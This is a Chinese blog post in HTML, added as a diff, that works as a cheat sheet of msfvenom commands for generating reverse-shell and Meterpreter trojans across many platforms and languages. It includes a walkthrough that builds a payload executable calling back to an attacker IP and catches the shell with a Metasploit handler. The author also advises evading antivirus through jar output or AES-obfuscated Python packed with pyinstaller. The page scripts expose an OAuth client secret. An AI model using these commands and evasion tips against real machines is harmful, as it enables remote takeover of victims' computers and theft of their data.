@@ -1,0 +1,948 @@
+<!DOCTYPE HTML>
+<html lang="">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="msfvenom生成各类Payload命令，远程木马攻击, Treecatee">
+    <meta name="description" content="   msfvenom生成各类Payload命令
+Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  ms">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>msfvenom生成各类Payload命令，远程木马攻击 | Treecatee</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://i.loli.net/2019/02/21/5c6e41bfcc0d9.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Treecatee</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>主页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-calendar"></i>
+            
+            <span>时间轴</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/book" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>资源</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/links" class="waves-effect waves-light">
+            
+            <i class="fa fa-edit"></i>
+            
+            <span>链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://i.loli.net/2019/02/21/5c6e41bfcc0d9.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Treecatee</div>
+        <div class="logo-desc">
+            
+            得之我幸，失之我命。
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                主页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-calendar"></i>
+                
+                时间轴
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/book" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                资源
+            </a>
+        </li>
+        
+        <li>
+            <a href="/links" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-edit"></i>
+                
+                链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        msfvenom生成各类Payload命令，远程木马攻击
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/远程木马攻击/" target="_blank">
+                                <span class="chip bg-color">远程木马攻击</span>
+                            </a>
+                        
+                            <a href="/tags/msfvenom/" target="_blank">
+                                <span class="chip bg-color">msfvenom</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Metasploit/" class="post-category" target="_blank">
+                                Metasploit
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2018-11-14
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
+                        988
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
+                        4 Min
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h4 id="msfvenom生成各类Payload命令"><a href="#msfvenom生成各类Payload命令" class="headerlink" title="   msfvenom生成各类Payload命令"></a><font face="Arial">   msfvenom生成各类Payload命令</font></h4><blockquote>
+<font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font>
+</blockquote>
+<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f elf &gt; shell.elf</your></your></font>
+
+
+<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f exe &gt; shell.exe</your></your></font>
+
+
+<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f macho &gt; shell.macho</your></your></font>
+
+
+
+<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><font face="Arial">msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.php</your></your></font>
+
+<font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font>
+
+
+<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f asp &gt; shell.asp</your></your></font>
+
+<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp</your></your></font>
+
+<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f war &gt; shell.war                    Scripting Payloads</your></your></font>
+
+<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><font face="Arial">msfvenom -p cmd/unix/reverse_python LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.py</your></your></font>
+
+
+<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><font face="Arial">msfvenom -p cmd/unix/reverse_bash LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.sh</your></your></font>
+
+
+<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><font face="Arial">msfvenom -p cmd/unix/reverse_perl LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.pl</your></your></font>
+
+
+<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font>
+
+
+<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font>
+
+
+<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT=<your port to connect on> -f  language    “language放在&lt;&gt;里”<br></your></p>
+<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font>
+
+<h5 id="Handlers模块"><a href="#Handlers模块" class="headerlink" title="Handlers模块"></a><font face="Arial">Handlers模块</font></h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
+<blockquote>
+<font face="Arial">use exploit/multi/handler</font><br> <font face="Arial">set LHOST <lhost value></lhost></font><br> <font face="Arial">set LPORT <lport value></lport></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘
+</blockquote>
+<hr>
+<p>&nbsp;<br>&nbsp;<br><strong>下面以一个实例说明使用方法</strong></p>
+<p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html" target="_blank" rel="noopener">Metasploit渗透测试笔记(Meterpreter篇</a></p>
+<p>远程控制软件–&gt;远控后门木马程序</p>
+<p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p>
+<p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p>
+<p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm" target="_blank" rel="noopener">参考文献一</a><br><a href="http://www.i0day.com/1173.html" target="_blank" rel="noopener">类似文献二</a></p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的ip LPORT=你的端口 -f exe -o payload.exe</p>
+<p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p>
+<p>具体步骤如下：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.168.2.146 LPORT<span class="token operator">=</span>44444 -f exe -o test.exe            
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p>
+<p>PS:之后的操作步骤是和上面的一样的↓</p>
+<p>之后在metasploit下连接后门程序，步骤如下：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">msfconsole                  --<span class="token operator">></span>开启metasploit
+use exploit/multi/handler       --<span class="token operator">></span>使用“exploit/multi/handler”这个模块连接后门程序
+show options   --<span class="token operator">></span>查看需要设置的配置信息//这里其实不需要配置任何信息的
+<span class="token keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --<span class="token operator">></span>使用tcp反向连接
+show options               --<span class="token operator">></span>查看需要设置的配置信息
+<span class="token keyword">set</span> LHOST<span class="token operator">=</span>192.168.2.146    --<span class="token operator">></span>设置我们攻击者自己的连接IP
+<span class="token keyword">set</span> LPORT<span class="token operator">=</span>44444            --<span class="token operator">></span>设置我们攻击浙自己的连接端口
+exploit                    --<span class="token operator">></span>执行连接，等待木马执行后连接
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p>
+<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>OK，完成了！<br>&nbsp;<br>&nbsp;</p>
+
+            </div>
+            <hr>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">Buy me a cup of coffee ☕.</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;Reprint please specify:
+                    </span>
+                    <a href="Treecatee.gitgub.io" class="b-link-green">Treecatee</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/post/metasploit1/" class="b-link-green">msfvenom生成各类Payload命令，远程木马攻击</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'f0e6b43ea59ab9e24a70',
+        clientSecret: '054e8ba8fc711a575e0997af9417f550710b57a5',
+        repo: 'Directoree.github.io',
+        owner: 'Directoree',
+        admin: "Directoree",
+        id: '2018-11-14T22-09-28',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'Treecatee.gitgub.io/post/metasploit1/';
+        this.page.identifier = '/post/metasploit1/';
+        this.page.title = 'msfvenom生成各类Payload命令，远程木马攻击';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/post/creategithubblog/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Hexo+Github博客搭建终极大法">
+                        
+                        <span class="card-title">Hexo+Github博客搭建终极大法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">2019.2.26更新最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？因为26对我来说是个特别的日子…..
+边听边看吧😊
+
+
+
+一、 </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Hexo-Github/" class="post-category" target="_blank">
+                                    Hexo-Github
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/博客搭建/" target="_blank">
+                        <span class="chip bg-color">博客搭建</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/post/hello-world/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        
+                        <span class="card-title">Hello World</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            Treecatee
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Treecatee<br />'
+            + 'Author: Treecatee<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4,h5,h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4,h5,h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">164.7k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://directoree.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1003432683@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1003432683" class="tooltipped" data-tooltip="QQ联系我: 1003432683" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://music.163.com/#/user/home?id=455041480" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-mixcloud"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword" class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
